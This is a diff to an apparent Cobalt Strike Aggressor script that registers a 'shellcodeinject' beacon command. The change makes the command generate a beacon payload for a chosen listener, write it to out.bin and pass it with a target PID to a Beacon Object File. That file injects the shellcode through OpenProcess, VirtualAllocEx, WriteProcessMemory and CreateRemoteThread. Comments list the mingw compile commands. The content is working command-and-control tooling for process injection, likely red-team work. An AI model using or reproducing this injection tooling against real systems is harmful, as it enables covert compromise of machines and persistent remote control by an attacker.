@@ -1,17 +1,26 @@
+# Chris Sikes
+# Apr 2021
 # $1 = beacon ID
 # $2 = pid
+# $3 = listener
+# scp * 192.168.122.130:/root/BeaconObjectFile/shellcodeinject
+# x86_64-w64-mingw32-gcc -c shellcodeinject.c -o shellcodeinject.x64.o
+# i686-w64-mingw32-gcc -c shellcodeinject.c -o shellcodeinject.x86.o
+# x86_64-w64-mingw32-gcc -c shellcodeinject.c -o shellcodeinject.o
+
 
 alias shellcodeinject {
-	local('$bid $handle $data $pid');
+	local('$bid $handle $data $pid $listener $payload');
 
 	# check our arguments
-	if (size(@_) != 2) {
-		berror($1, "shellcodeinject: not enough arguments. Enter the PID");
+	if (size(@_) != 3) {
+		berror($1, "shellcodeinject: not enough arguments. Enter the PID and Listener");
 		return;
 	}
 
 	# parse our arguments
 	$pid	= $2;
+	$listener = $3;
 
 	# Verify PID is a number
 	if ((!-isnumber $pid) || (int($pid) <= 0))
@@ -25,14 +34,28 @@ alias shellcodeinject {
 	$data	= readb($handle, -1);
 	closef($handle);
 
-	# pack our arguments
-	$args	= bof_pack($1, "s", $pid);
 
-	# announce to our user..
-	btask($1, "Injecting into PID $2");
+	if (listener_info($3) is $null)
+	{
+		berror($1, "Listener $3 is not found");
+	}
+	else
+	{
+    		# Generate a new payload 
+    		$payload = payload($3, "x64", "thread");
+		$handle2 = openf(">out.bin");
+		writeb($handle2, $payload);
+		closef($handle2);
+   
+		# pack our arguments
+		$args	= bof_pack($1, "ib", $pid, $payload);
 
-	# run a BOF
-	beacon_inline_execute($1, $data, "go", $args);
+		# announce to our user..
+		btask($1, "Injecting into PID $2");
+
+		# run a BOF
+		beacon_inline_execute($1, $data, "go", $args);
+	}
 }
-beacon_command_register("shellcodeinject", "Basic PE shellcode injection method", "Synopsis: shellcodeinject [pid] \n\nBasic OpenProcess, VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread\nWin32APIs in a beacon object file to inject into a target PID.");
+beacon_command_register("shellcodeinject", "Basic PE shellcode injection method", "Synopsis: shellcodeinject [pid] [listener]\n\nBasic OpenProcess, VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread\nWin32APIs in a beacon object file to inject into a target PID.");
 
